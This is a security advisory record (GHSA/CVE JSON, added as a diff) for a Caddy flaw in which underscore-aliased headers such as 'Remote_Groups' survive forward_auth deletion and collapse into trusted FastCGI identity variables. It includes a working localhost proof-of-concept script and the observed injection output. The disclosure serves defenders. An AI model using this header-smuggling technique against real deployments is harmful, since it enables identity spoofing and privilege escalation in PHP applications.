@@ -1,0 +1,68 @@
+{
+  "id": "GHSA-f59h-q822-g45g",
+  "modified": "2026-06-16T21:45:22.634649887Z",
+  "published": "2026-06-16T21:28:28Z",
+  "aliases": [
+    "CVE-2026-52845"
+  ],
+  "summary": "Caddy: FastCGI header normalization bypass in `forward_auth copy_headers`",
+  "details": "### Summary\n\n`forward_auth copy_headers` deletes the exact client-supplied identity header before copying the trusted value from the auth gateway. But when the request later goes through `php_fastcgi`, Caddy normalizes HTTP headers into CGI variables by replacing `-` with `_`.\n\nThis lets a client send an underscore alias that survives the `forward_auth` delete step but becomes the same PHP/FastCGI variable:\n\n```text\nRemote-Groups  -\u003e HTTP_REMOTE_GROUPS\nRemote_Groups  -\u003e HTTP_REMOTE_GROUPS\n\nRemote-User    -\u003e HTTP_REMOTE_USER\nRemote_User    -\u003e HTTP_REMOTE_USER\n```\n\nResult: a remote client can inject or sometimes override identity/group headers trusted by PHP/FastCGI applications behind Caddy.\n\n### Details\n\n`forward_auth copy_headers` intentionally removes client-controlled headers before setting values from the auth response:\n\n- `modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go:212`\n- `modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go:222`\n\nThat delete is exact-field deletion through `http.Header.Del()`:\n\n- `modules/caddyhttp/headers/headers.go:255`\n- `modules/caddyhttp/headers/headers.go:281`\n\nSo deleting `Remote-Groups` does not delete `Remote_Groups`.\n\nLater, FastCGI exports all request headers into CGI variables:\n\n- `modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:410`\n- `modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:414`\n- `modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:510`\n\nThe normalizer replaces hyphens with underscores:\n\n```go\nstrings.NewReplacer(\" \", \"_\", \"-\", \"_\")\n```\n\nSo the trusted header and the attacker-controlled alias collide in the backend-visible CGI/PHP namespace.\n\nThis is distinct from GHSA-7r4p-vjf4-gxv4. That issue allowed exact copied headers to survive. This report reproduces after the exact-header fix because the bypass uses a different HTTP field name that only becomes equivalent during Caddy's FastCGI export.\n\n### PoC\n\nRun from the Caddy repository root with `bash`:\n\n```bash\nset -euo pipefail\n\ntmpdir=$(mktemp -d /tmp/caddy-fastcgi-header-collision.XXXXXX)\nmkdir -p \"$tmpdir/www\"\nprintf '\u003c?php echo \"ok\"; ?\u003e\\n' \u003e \"$tmpdir/www/index.php\"\n\ncat \u003e \"$tmpdir/servers.go\" \u003c\u003c'GO'\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\t\"net/http\"\n\t\"net/http/fcgi\"\n)\n\nfunc main() {\n\tgo func() {\n\t\tmux := http.NewServeMux()\n\t\tmux.HandleFunc(\"/auth\", func(w http.ResponseWriter, r *http.Request) {\n\t\t\tw.Header().Set(\"Remote-User\", \"alice\")\n\t\t\tw.WriteHeader(http.StatusNoContent)\n\t\t})\n\t\tlog.Fatal(http.ListenAndServe(\"127.0.0.1:19011\", mux))\n\t}()\n\n\tln, err := net.Listen(\"tcp\", \"127.0.0.1:19010\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tlog.Fatal(fcgi.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"HTTP_REMOTE_USER=%s\\nHTTP_REMOTE_GROUPS=%s\\n\",\n\t\t\tr.Header.Get(\"Remote-User\"),\n\t\t\tr.Header.Get(\"Remote-Groups\"))\n\t})))\n}\nGO\n\ncat \u003e \"$tmpdir/Caddyfile\" \u003c\u003cEOF\n{\n\tadmin off\n\tauto_https off\n\tdebug\n}\n\n:9082 {\n\tlog\n\troot * $tmpdir/www\n\tforward_auth 127.0.0.1:19011 {\n\t\turi /auth\n\t\tcopy_headers Remote-User Remote-Groups\n\t}\n\tphp_fastcgi 127.0.0.1:19010\n}\nEOF\n\ncleanup() {\n\tkill \"${caddy_pid:-}\" \"${servers_pid:-}\" 2\u003e/dev/null || true\n}\ntrap cleanup EXIT\n\ngo run \"$tmpdir/servers.go\" \u003e\"$tmpdir/servers.log\" 2\u003e\u00261 \u0026\nservers_pid=$!\n\nfor i in $(seq 1 80); do\n\tif (echo \u003e /dev/tcp/127.0.0.1/19011) \u003e/dev/null 2\u003e\u00261 \u0026\u0026\n\t   (echo \u003e /dev/tcp/127.0.0.1/19010) \u003e/dev/null 2\u003e\u00261; then\n\t\tbreak\n\tfi\n\tsleep 0.25\ndone\n\ngo run ./cmd/caddy run --config \"$tmpdir/Caddyfile\" --adapter caddyfile \u003e\"$tmpdir/caddy.log\" 2\u003e\u00261 \u0026\ncaddy_pid=$!\n\nfor i in $(seq 1 80); do\n\tif (echo \u003e /dev/tcp/127.0.0.1/9082) \u003e/dev/null 2\u003e\u00261; then\n\t\tbreak\n\tfi\n\tsleep 0.25\ndone\n\ncurl --noproxy '*' -v http://127.0.0.1:9082/index.php\ncurl --noproxy '*' -v -H 'Remote_Groups: admin' http://127.0.0.1:9082/index.php\ncat \"$tmpdir/caddy.log\"\n```\n\nObserved on commit `6c675e29f87cbe7326983ddb6d739175119d394c`:\n\nBaseline:\n\n```text\n\u003e GET /index.php HTTP/1.1\n\u003c HTTP/1.1 200 OK\n\nHTTP_REMOTE_USER=alice\nHTTP_REMOTE_GROUPS=\n```\n\nWith attacker header:\n\n```text\n\u003e GET /index.php HTTP/1.1\n\u003e Remote_Groups: admin\n\u003c HTTP/1.1 200 OK\n\nHTTP_REMOTE_USER=alice\nHTTP_REMOTE_GROUPS=admin\n```\n\nCaddy debug log confirms the FastCGI environment contained:\n\n```text\n\"HTTP_REMOTE_USER\": \"alice\"\n\"HTTP_REMOTE_GROUPS\": \"admin\"\n```\n\nThe auth gateway returned `Remote-User: alice` only. It never returned `Remote-Groups`.\n\n### Impact\n\nThis affects Caddy deployments that use:\n\n- `forward_auth` with `copy_headers` for identity or authorization headers;\n- `php_fastcgi` / FastCGI after the auth check;\n- a PHP/FastCGI application that trusts the resulting `HTTP_*` variables.\n\nImpact examples:\n\n- deterministic group/role injection when the auth gateway omits an optional header, e.g. `Remote_Groups: admin` becomes `HTTP_REMOTE_GROUPS=admin`;\n- probabilistic user impersonation when both the auth gateway and client provide colliding identity headers, e.g. `Remote-User` and `Remote_User` both map to `HTTP_REMOTE_USER`.\n\nRealistic examples include trusted-header SSO deployments such as Firefly III `remote_user_guard` using `HTTP_REMOTE_USER`, or MediaWiki `Auth_remoteuser` using `HTTP_X_AUTHENTIK_USERNAME`.\n\n## AI disclosure\n\nThe LLM was used to help analyze the Caddy codebase, compare relevant code paths, draft the report, and organize reproduction steps. Human security research judgment and insight were used to guide the investigation, validate the root cause, run the local reproduction, assess impact, and make the final report conclusions.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/caddyserver/caddy/v2",
+        "purl": "pkg:golang/github.com/caddyserver/caddy/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-f59h-q822-g45g/GHSA-f59h-q822-g45g.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/caddyserver/caddy",
+        "purl": "pkg:golang/github.com/caddyserver/caddy"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.0.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-f59h-q822-g45g/GHSA-f59h-q822-g45g.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-f59h-q822-g45g"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/caddyserver/caddy"
+    }
+  ]
+}
